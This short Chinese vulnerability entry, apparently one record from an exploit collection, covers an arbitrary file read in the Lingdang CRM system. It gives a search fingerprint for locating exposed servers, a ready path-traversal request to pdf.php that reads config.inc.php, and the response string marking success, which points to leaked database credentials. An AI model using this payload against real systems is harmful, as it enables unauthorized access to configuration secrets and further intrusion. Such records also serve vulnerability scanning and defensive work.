# 灵当CRM客户管理系统pdf任意文件读取漏洞

灵当CRM客户管理系统pdf ｜ 任意文件读取/写入 ｜ —
- **指纹**：`body="crmcommon/js/jquery/jquery-1.10.1.min.js"`
- **请求**：`GET /crm/data/pdf.php?url=../config.inc.php HTTP/1.1`
- **响应特征**：200 db_username